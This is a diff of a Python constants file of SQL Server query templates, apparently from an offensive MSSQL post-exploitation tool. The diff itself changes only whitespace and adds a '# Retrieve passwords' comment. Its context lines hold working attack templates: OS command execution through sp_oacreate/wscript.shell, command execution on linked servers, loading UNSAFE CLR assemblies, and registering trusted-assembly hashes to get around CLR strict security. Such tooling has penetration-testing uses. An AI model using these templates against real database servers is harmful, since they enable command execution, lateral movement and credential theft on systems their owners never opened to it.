@@ -10,8 +10,6 @@ EXEC_AT = "EXEC ('{query}') AT \"{linked_server}\";"
 SP_OAMETHOD = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{command}';"
 PROCEDURE_EXECUTION = "DECLARE @x AS VARCHAR(100)='{procedure}'; EXEC @x '{command}';"
 
-
-
 # General queries
 USER_CONTEXT = "SELECT USER_NAME() as username;"
 SERVER_HOSTNAME = "SELECT @@SERVERNAME AS [ServerName];"
@@ -28,8 +26,11 @@ RECONFIGURE_PROCEDURE = "EXEC sp_configure '{procedure}', {status}; RECONFIGURE;
 # Custom assemblies queries
 IS_CUSTOM_ASM_ENABLED = "SELECT CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled') = 1 THEN 'True' ELSE 'False' END AS [clr_enabled], CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options') = 1 THEN 'True' ELSE 'False' END AS [show_advanced_options], CASE WHEN (SELECT value_in_use FROM sys.configurations WHERE name = 'clr strict security') = 1 THEN 'True' ELSE 'False' END AS [clr_strict_security];"
 ADD_CUSTOM_ASM = "CREATE ASSEMBLY {asm_name} FROM {custom_asm} WITH PERMISSION_SET = UNSAFE"
+
 CREATE_PROCEDURE = "CREATE PROCEDURE [dbo].[{procedure_name}] @{arg} NVARCHAR (4000) AS EXTERNAL NAME [{asm_name}].[StoredProcedures].[{procedure_name}];"
 IS_MY_APP_TRUSTED = "SELECT CASE WHEN EXISTS (SELECT 1 FROM sys.trusted_assemblies WHERE hash = {myhash}) THEN 'True' ELSE 'False' END AS [status];"
 TRUST_MY_APP = "EXEC sp_add_trusted_assembly @hash = {myhash}, @description = N'Trusted Assembly for My Application';"
 UNTRUST_MY_APP = "EXEC sp_drop_trusted_assembly @hash = {myhash};"
 CUSTOM_ASM_CLEANUP = "DROP PROCEDURE {procedure_name}; DROP ASSEMBLY {asm_name};"
+
+# Retrieve passwords
